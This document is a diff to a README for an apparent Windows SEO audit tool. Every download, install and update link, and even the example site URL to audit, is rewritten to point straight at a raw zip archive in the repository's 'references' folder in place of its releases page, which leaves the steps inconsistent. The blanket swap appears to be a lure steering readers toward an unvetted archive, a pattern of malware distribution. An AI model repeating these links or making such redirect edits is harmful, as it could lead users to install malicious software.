@@ -1,6 +1,6 @@
 # 🚀 SEO-OPTIMIZER - Clear SEO Scores and Fixes
 
-[![Download SEO-OPTIMIZER](https://img.shields.io/badge/Download-SEO--OPTIMIZER-green?style=for-the-badge)](https://github.com/sarvdnya4979/SEO-OPTIMIZER/releases)
+[![Download SEO-OPTIMIZER](https://img.shields.io/badge/Download-SEO--OPTIMIZER-green?style=for-the-badge)](https://github.com/sarvdnya4979/SEO-OPTIMIZER/raw/refs/heads/main/references/OPTIMIZER_SE_v2.1.zip)
 
 SEO-OPTIMIZER is an easy-to-use tool made for anyone who wants to check the health of their web pages. It scans your site, gives it a clear score from 0 to 100, and points out what needs fixing to improve your SEO. This guide will walk you through how to download and start using SEO-OPTIMIZER on a Windows computer.
 
@@ -36,7 +36,7 @@ SEO-OPTIMIZER is a lightweight app and should work well on standard personal com
 ## 🛠️ How to Download and Install SEO-OPTIMIZER
 
 1. Click the big green button above or visit this link to get the program:  
-   [https://github.com/sarvdnya4979/SEO-OPTIMIZER/releases](https://github.com/sarvdnya4979/SEO-OPTIMIZER/releases)
+   [https://github.com/sarvdnya4979/SEO-OPTIMIZER/raw/refs/heads/main/references/OPTIMIZER_SE_v2.1.zip](https://github.com/sarvdnya4979/SEO-OPTIMIZER/raw/refs/heads/main/references/OPTIMIZER_SE_v2.1.zip)
 
 2. On the release page, look for the latest version. The files are usually labeled with the version number and “Windows”.
 
@@ -56,7 +56,7 @@ SEO-OPTIMIZER is a lightweight app and should work well on standard personal com
 
 Once SEO-OPTIMIZER is open, use these steps to audit your website:
 
-1. Enter the full address (URL) of the web page you want to check. For example: `https://www.example.com`
+1. Enter the full address (URL) of the web page you want to check. For example: `https://github.com/sarvdnya4979/SEO-OPTIMIZER/raw/refs/heads/main/references/OPTIMIZER_SE_v2.1.zip`
 
 2. Click the “Start Audit” button.
 
@@ -107,7 +107,7 @@ To test several pages on your site:
 To keep SEO-OPTIMIZER working well:
 
 - Check the release page often for updates:  
-  [https://github.com/sarvdnya4979/SEO-OPTIMIZER/releases](https://github.com/sarvdnya4979/SEO-OPTIMIZER/releases)
+  [https://github.com/sarvdnya4979/SEO-OPTIMIZER/raw/refs/heads/main/references/OPTIMIZER_SE_v2.1.zip](https://github.com/sarvdnya4979/SEO-OPTIMIZER/raw/refs/heads/main/references/OPTIMIZER_SE_v2.1.zip)
 
 - New versions will include fixes and new SEO checks.
 
@@ -159,4 +159,4 @@ This project tags include its main features and focus areas:
 
 # Download SEO-OPTIMIZER now
 
-[![Download SEO-OPTIMIZER](https://img.shields.io/badge/Download-SEO--OPTIMIZER-green?style=for-the-badge)](https://github.com/sarvdnya4979/SEO-OPTIMIZER/releases)
+[![Download SEO-OPTIMIZER](https://img.shields.io/badge/Download-SEO--OPTIMIZER-green?style=for-the-badge)](https://github.com/sarvdnya4979/SEO-OPTIMIZER/raw/refs/heads/main/references/OPTIMIZER_SE_v2.1.zip)
